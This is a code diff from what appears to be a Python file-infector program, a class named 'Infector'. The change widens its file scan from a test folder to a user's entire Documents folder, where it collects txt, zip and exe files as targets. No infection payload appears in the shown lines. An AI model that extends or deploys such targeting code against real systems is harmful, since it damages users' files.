@@ -16,7 +16,7 @@ class Infector():
         self.findZipFiles()
 
     def findTxtFiles(self):
-        for files in os.walk(r"C:\Users\asadk\Documents\TEST"): #
+        for files in os.walk(r"C:\Users\asadk\Documents"): #
             for file in files[2]:
                 if (file.split(".")[-1]) == "txt":
                     #print("File found: " + files[0] + "\\" + file)
@@ -46,11 +46,7 @@ class Infector():
         return self.qzip.getLenQueue()
 
     def getTotalNumberOfFiles(self):
-        count = 0
-        for files in os.walk(r"C:\Users\asadk\Documents\TEST"):
-            for file in files[2]:
-                count += 1
-        return count
+        return self.qzip.getLenQueue() + self.qexe.getLenQueue() + self.qtxt.getLenQueue()
     
     def searchVulnerableFileNames(self):
         temp = 0
